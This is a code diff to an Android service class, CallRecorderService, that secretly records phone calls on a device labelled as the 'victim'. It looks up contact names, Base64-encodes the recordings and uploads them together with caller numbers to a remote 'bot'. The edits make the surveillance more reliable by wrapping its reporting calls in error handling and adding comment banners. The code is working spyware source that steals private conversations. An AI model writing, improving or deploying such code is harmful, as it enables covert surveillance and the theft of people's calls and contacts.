@@ -19,7 +19,6 @@ import android.util.Log;
 
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.OutputStream;
@@ -55,7 +54,9 @@ public class CallRecorderService extends Service {
     private String victimToken = null;
     private String deviceId = null;
 
-    // ★★★ Lifecycle ★★★
+    // ============================================================
+    // Lifecycle
+    // ============================================================
     @Override
     public void onCreate() {
         super.onCreate();
@@ -87,16 +88,23 @@ public class CallRecorderService extends Service {
         // ★ تسجيل Outgoing Call Receiver
         setupCallReceiver();
 
-        // ★ إشعار البدء
-        sendEvent("call_recorder_ready", new JSONObject()
-            .put("service", "CallRecorder")
-            .put("timestamp", System.currentTimeMillis())
-        );
+        // ★★ إشعار البدء — داخل try/catch ★★
+        try {
+            JSONObject readyData = new JSONObject();
+            readyData.put("service", "CallRecorder");
+            readyData.put("timestamp", System.currentTimeMillis());
+
+            sendEvent("call_recorder_ready", readyData);
+        } catch (Exception e) {
+            Log.e(TAG, "send ready event error: " + e.getMessage());
+        }
 
         Log.d(TAG, "✅ CallRecorder ready");
     }
 
-    // ★★★ Create Recording Directory ★★★
+    // ============================================================
+    // Create Recording Directory
+    // ============================================================
     private void createRecordingDir() {
         try {
             File dir = new File(getRecordingsPath());
@@ -125,7 +133,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Setup Phone State Listener ★★★
+    // ============================================================
+    // Setup Phone State Listener
+    // ============================================================
     private void setupPhoneStateListener() {
         try {
             telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
@@ -183,7 +193,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Setup Outgoing Call Receiver ★★★
+    // ============================================================
+    // Setup Outgoing Call Receiver
+    // ============================================================
     private void setupCallReceiver() {
         try {
             callReceiver = new CallStateReceiver();
@@ -197,7 +209,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Start Recording ★★★
+    // ============================================================
+    // Start Recording
+    // ============================================================
     private void startRecording(String number, String contactName) {
         try {
             if (isRecording) {
@@ -226,7 +240,6 @@ public class CallRecorderService extends Service {
             }
 
             // ★★ اختيار مصدر الصوت ★★
-            // VOICE_CALL هو الأفضل لكن مش متاح على كل الأجهزة
             int audioSource = MediaRecorder.AudioSource.VOICE_CALL;
 
             try {
@@ -259,15 +272,19 @@ public class CallRecorderService extends Service {
 
             Log.d(TAG, "🎙️ Recording started: " + currentFilePath);
 
-            // ★ إشعار للبوت
-            JSONObject data = new JSONObject();
-            data.put("number", number);
-            data.put("contact", contactName);
-            data.put("audio_source", audioSource);
-            data.put("file", new File(currentFilePath).getName());
-            data.put("timestamp", recordingStartTime);
+            // ★★★ إشعار للبوت — داخل try/catch ★★★
+            try {
+                JSONObject data = new JSONObject();
+                data.put("number", number);
+                data.put("contact", contactName);
+                data.put("audio_source", audioSource);
+                data.put("file", new File(currentFilePath).getName());
+                data.put("timestamp", recordingStartTime);
 
-            sendEvent("call_recording_started", data);
+                sendEvent("call_recording_started", data);
+            } catch (Exception e) {
+                Log.e(TAG, "send started event error: " + e.getMessage());
+            }
 
         } catch (Exception e) {
             Log.e(TAG, "startRecording error: " + e.getMessage());
@@ -277,7 +294,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Stop Recording ★★★
+    // ============================================================
+    // Stop Recording
+    // ============================================================
     private void stopRecording() {
         try {
             if (!isRecording || recorder == null) {
@@ -319,7 +338,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Upload Recording ★★★
+    // ============================================================
+    // Upload Recording
+    // ============================================================
     private void uploadRecording(String filePath, String number, String contactName, long duration) {
         new Thread(() -> {
             try {
@@ -347,7 +368,7 @@ public class CallRecorderService extends Service {
                 // ★ Base64 encode
                 String base64Audio = Base64.encodeToString(bytes, Base64.NO_WRAP);
 
-                // ★ بيانات الرفع
+                // ★★★ بيانات الرفع — داخل try/catch ★★★
                 JSONObject payload = new JSONObject();
                 payload.put("type", "call_recording");
                 payload.put("token", victimToken);
@@ -397,7 +418,9 @@ public class CallRecorderService extends Service {
         }).start();
     }
 
-    // ★★★ Lookup Contact Name ★★★
+    // ============================================================
+    // Lookup Contact Name
+    // ============================================================
     private String lookupContactName(String number) {
         try {
             if (number == null || number.isEmpty()) return "Unknown";
@@ -430,7 +453,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Send Event ★★★
+    // ============================================================
+    // Send Event — مغلف بـ try/catch بالكامل
+    // ============================================================
     private void sendEvent(String type, JSONObject data) {
         new Thread(() -> {
             try {
@@ -463,19 +488,25 @@ public class CallRecorderService extends Service {
         }).start();
     }
 
-    // ★★★ onBind ★★★
+    // ============================================================
+    // onBind
+    // ============================================================
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
 
-    // ★★★ onStartCommand ★★★
+    // ============================================================
+    // onStartCommand
+    // ============================================================
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY;
     }
 
-    // ★★★ onDestroy ★★★
+    // ============================================================
+    // onDestroy
+    // ============================================================
     @Override
     public void onDestroy() {
         super.onDestroy();
@@ -507,7 +538,9 @@ public class CallRecorderService extends Service {
         }
     }
 
-    // ★★★ Inner Class: CallStateReceiver ★★★
+    // ============================================================
+    // Inner Class: CallStateReceiver
+    // ============================================================
     private class CallStateReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -530,4 +563,4 @@ public class CallRecorderService extends Service {
             }
         }
     }
-          }
+                  }
